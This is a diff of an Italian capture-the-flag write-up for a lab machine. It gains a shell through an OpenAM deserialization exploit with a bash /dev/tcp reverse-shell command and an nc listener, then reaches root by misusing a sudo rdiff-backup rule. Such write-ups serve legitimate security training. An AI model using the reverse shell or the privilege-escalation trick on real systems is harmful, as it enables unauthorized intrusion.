@@ -59,8 +59,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```bash
 /assets              [36m (Status: 301)[0m [Size: 178][34m [--> https://management.htb/assets/][0m
 ```
-# Dopo una ricerca su OpenAm Spunta un CVE:-> CVE-2026-33439. su:-> `https://www.csipiemonte.it/it/notizia-csirt/openam-cve-2026-33439-rce-pre-autenticazione-via-deserializzazione-java-exploit`
-```bash
+- [x] Dopo una ricerca su OpenAm Spunta un CVE:-> CVE-2026-33439. su:-> `https://www.csipiemonte.it/it/notizia-csirt/openam-cve-2026-33439-rce-pre-autenticazione-via-deserializzazione-java-exploit`
+```js
 + python3 exploit.py --url https://sso.management.htb --method POST --command "bash -c bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1"
 
 + ❯ nc -lvnp 4444
@@ -70,7 +70,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 + openam
 
 ```
-### Enumeration System `cd /opt/`
+#### Enumeration System `cd /opt/`
 ```bash
 openam@management:$ find \. -name "config*"
 ./glpi/front/config.form.php
@@ -157,7 +157,8 @@ owen@management:~$ cat user.txt
 0ed29XXXXXXXXXXXXXXXXXXXXXXXX
 owen@management:~$ 
 ```
-### Privilege Escalation
+## Privilege Escalation
+
 ```bash
 owen@management:~$ sudo -l 
 Matching Defaults entries for owen on management:
@@ -167,8 +168,11 @@ User owen may run the following commands on management:
     (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
 owen@management:~$ 
 rdiff-backup --remote-schema sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s backup /::/root /tmp/rootbak
+
 ```
-```bash
+
+```js
+
 cd rootbak/
 owen@management:/tmp/rootbak$ ls
 rdiff-backup-data  root.txt
@@ -176,4 +180,5 @@ owen@management:/tmp/rootbak$ cat root.txt
 1cXXXXXXXXXXXXXXXXXXXXXXXXXX
 owen@management:/tmp/rootbak$
 ```
-# Finish
+### Macchina Completata
+- [x] Per info e contact: <salvo8253@live.it>
